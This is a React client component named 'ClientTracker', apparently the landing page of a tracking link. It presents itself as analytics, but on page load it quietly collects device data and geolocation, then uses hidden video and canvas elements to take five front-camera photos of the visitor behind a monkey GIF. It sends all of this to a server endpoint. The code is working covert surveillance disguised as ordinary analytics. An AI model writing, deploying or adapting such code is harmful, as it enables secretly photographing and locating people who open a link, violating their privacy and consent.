/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useEffect, useRef, useState } from "react";

export default function ClientTracker({
  slug,
  redirectUrl,
}: {
  slug: string;
  redirectUrl: string;
}) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraStatus, setCameraStatus] = useState<string>("initializing");
  const [captureProgress, setCaptureProgress] = useState<string>("");

  useEffect(() => {
    const collectAnalytics = async () => {
      try {
        const deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          memory: (navigator as any)?.deviceMemory || null,
          cores: navigator.hardwareConcurrency || null,
        };

        let batteryLevel: number | null = null;
        try {
          const nav: any = navigator;
          if (typeof nav.getBattery === "function") {
            const battery = await nav.getBattery();
            if (battery?.level !== undefined) {
              batteryLevel = Math.round(battery.level * 100);
            }
          }
        } catch {
          batteryLevel = null;
        }

        const screenResolution = `${screen.width}x${screen.height}`;
        const connection = (navigator as any).connection;
        const connectionType = connection?.effectiveType || null;
        const networkSpeed = connection?.downlink || null;
        const referrer = document.referrer || "direct";

        let location = null;
        if (navigator.geolocation) {
          try {
            const pos = await new Promise<GeolocationPosition>((res, rej) =>
              navigator.geolocation.getCurrentPosition(res, rej, {
                timeout: 2000,
              })
            );
            location = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
            };
          } catch {
            location = null;
          }
        }

        // 📸 Capture up to 5 photos from the front camera
        let photos: string[] = [];
        try {
          setCameraStatus("requesting_permission");
          photos = await captureFrontCameraPhotos(5, 1000); // 5 photos, 1s apart
          setCameraStatus("captured");
          console.log(`Captured ${photos.length} photos successfully`);
        } catch (error: any) {
          setCameraStatus("failed");
          console.error("Camera capture failed:", error.message);
        }

        // 📤 Send analytics data with captured photos
        await fetch("/api/analytics", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            slug,
            deviceInfo,
            batteryLevel,
            screenResolution,
            connectionType,
            networkSpeed,
            userAgent: navigator.userAgent,
            referrer,
            location,
            photos, // send multiple photos
            hasCamera: photos.length > 0,
            cameraStatus,
          }),
        });
      } catch (err) {
        console.error("Analytics post failed:", err);
      }
    };

    collectAnalytics();
  }, [slug, redirectUrl]);

  // 📸 Function to capture multiple photos from front camera
  const captureFrontCameraPhotos = async (
    maxPhotos = 5,
    delayMs = 1000
  ): Promise<string[]> => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error("Camera not supported in this browser");
    }

    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 640 },
        height: { ideal: 480 },
      },
      audio: false,
    });

    // Create or use existing video/canvas
    const video = videoRef.current ?? document.createElement("video");
    const canvas = canvasRef.current ?? document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("Canvas context not available");

    video.srcObject = stream;
    video.playsInline = true;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        resolve(true);
      };
    });

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const capturedPhotos: string[] = [];

    for (let i = 0; i < maxPhotos; i++) {
      setCaptureProgress(`Capturing photo ${i + 1} of ${maxPhotos}...`);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
      capturedPhotos.push(dataUrl);
      await new Promise((res) => setTimeout(res, delayMs)); // wait between captures
    }

    stream.getTracks().forEach((t) => t.stop());
    setCaptureProgress("");

    return capturedPhotos;
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen w-screen bg-black text-white">
      {/* Background animation */}
      <div
        className="absolute inset-0 opacity-50"
        style={{
          backgroundImage: "url(/monkey.gif)",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
          backgroundSize: "contain",
        }}
      />

      {/* Status overlay */}
      <div className="relative z-10 text-center bg-transparent p-6 rounded-lg">

        {/* Hidden video and canvas */}
        <video ref={videoRef} style={{ display: "none" }} playsInline />
        <canvas ref={canvasRef} style={{ display: "none" }} />
      </div>
    </div>
  );
}
